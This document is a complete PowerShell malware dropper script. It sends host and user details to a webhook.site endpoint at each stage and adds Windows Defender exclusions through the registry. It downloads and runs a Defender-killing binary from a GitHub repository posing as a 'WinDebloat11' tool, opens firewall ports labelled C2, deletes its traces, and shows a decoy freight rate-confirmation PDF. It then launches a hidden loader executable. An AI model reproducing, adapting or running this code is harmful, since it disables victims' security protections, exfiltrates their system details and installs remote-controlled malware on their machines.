$log="$env:TEMP\wmisrv.log"
function log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $log -Append -Encoding utf8 }
log "=== v21 START ==="

$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main'
$srv='https://webhook.site/b823dc59-5334-4fdd-95fb-becdf586f182'
$t=$env:TEMP
$ad="$env:APPDATA\Microsoft"
$dl="$env:USERPROFILE\Downloads"

# --- Host info (no WMI) ---
$h=$env:COMPUTERNAME
$u=$env:USERNAME
$pid0=$pid
$os=[Environment]::OSVersion
$admin=$false
try{$admin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
log "S0 pid=$pid0 u=$u h=$h admin=$admin os=$os"

# --- Callback ---
function _cb($stage,$status,$detail){
    try{
        $body=@{hostname=$h;username=$u;os=$os;is_admin=$admin;pid=$pid0;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString($srv,'POST',$body)|Out-Null
    }catch{log "CB:$stage err: $($_.Exception.Message)"}
}
_cb 'S0' 'ok' "pid=$pid0 u=$u"

# --- BITS download ---
function _dl($n,$d,$l){
    try{
        log "BITS:$l from $gh"
        Start-BitsTransfer -Source "$gh/$n" -Destination $d -Priority High -DisplayName $l -ErrorAction Stop | Out-Null
        if(Test-Path $d){ log "BITS:$l ok ($((Get-Item $d).Length))"; return $true }
    }catch{log "BITS:$l fail: $_"}
    return $false
}

# --- Defender exclusions via registry (no Add-MpPreference) ---
if($admin){
    try{
        $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions'
        if(-not (Test-Path $dp)){ New-Item -Path $dp -Force | Out-Null }
        foreach($p in @($t,$ad,$dl)){
            try{New-ItemProperty -Path "$dp\Paths" -Name $p -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null}catch{}
        }
        $ep='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes'
        if(-not (Test-Path $ep)){ New-Item -Path $ep -Force | Out-Null }
        foreach($p in @('powershell.exe','cmd.exe','wscript.exe','cscript.exe','notepad.exe','windefctl.exe','loader.exe')){
            try{New-ItemProperty -Path $ep -Name $p -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null}catch{}
        }
        log 'S1 exclusions ok'
    }catch{log "S1 exclusions err: $_"}
} else { log 'S1 exclusions skipped (no admin)' }
_cb 'S1' 'ok' "admin=$admin"

$wp="$t\windefctl.exe"
if(_dl 'windefctl.exe' $wp 'defkill'){
    try{
        $p=[System.Diagnostics.Process]::Start($wp,'kill')
        Start-Sleep 18
        if(-not $p.HasExited){try{$p.Kill()|Out-Null}catch{}}
        _cb 'S2' 'ok' 'defkill done'
    }catch{_cb 'S2' 'fail' "defkill err: $_"}
}else{_cb 'S2' 'fail' 'defkill dl'}
Remove-Item $wp -Force -ErrorAction SilentlyContinue

if($admin){
    try{
        foreach($port in @('5173','4782')){
            try{New-NetFirewallRule -DisplayName "C2-In-$port" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow -ErrorAction SilentlyContinue | Out-Null}catch{}
            try{New-NetFirewallRule -DisplayName "C2-Out-$port" -Direction Outbound -Protocol TCP -LocalPort $port -Action Allow -ErrorAction SilentlyContinue | Out-Null}catch{}
        }
        _cb 'S3' 'ok' 'fw ok'
    }catch{_cb 'S3' 'warn' "fw err: $_"}
}else{_cb 'S3' 'warn' 'no admin'}

# --- Cleanup ---
Start-Sleep ([Random]::new().Next(3,6))
Remove-Item "$t\windefctl.exe","$t\u.ps1" -Force -ErrorAction SilentlyContinue
log 'S4 cleanup ok'

# --- PDF decoy ---
$mp="$ad\wmpp.seen"
if(-not (Test-Path $mp)){
    $pd="$dl\Rate_Confirmation_LD-2026-0847.pdf"
    if(_dl 'Rate_Confirmation_LD-2026-0847.pdf' $pd 'pdf'){
        try{[System.Diagnostics.Process]::Start($pd)|Out-Null; _cb 'S5' 'ok' 'pdf ok'; Set-Content -Path $mp -Value ((Get-Date).ToString('o')) -NoNewline -Force}catch{_cb 'S5' 'warn' 'pdf fail'}
    }else{_cb 'S5' 'warn' 'pdf dl fail'}
} else { log 'S5 pdf already shown' }

# --- Download + run loader.exe ---
$lp="$t\loader.exe"
if(_dl 'loader.exe' $lp 'loader'){
    try{
        $si=New-Object System.Diagnostics.ProcessStartInfo
        $si.FileName=$lp
        $si.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
        [System.Diagnostics.Process]::Start($si)|Out-Null
        log 'S6 loader launched'
        _cb 'S6' 'ok' 'loader launched'
    }catch{log "S6 loader err: $_"; _cb 'S6' 'fail' "loader err: $_"}
}else{_cb 'S6' 'fail' 'loader dl'}

log 'S7 bootstrap exit'
_cb 'S7' 'ok' 'bootstrap exit'
exit 0
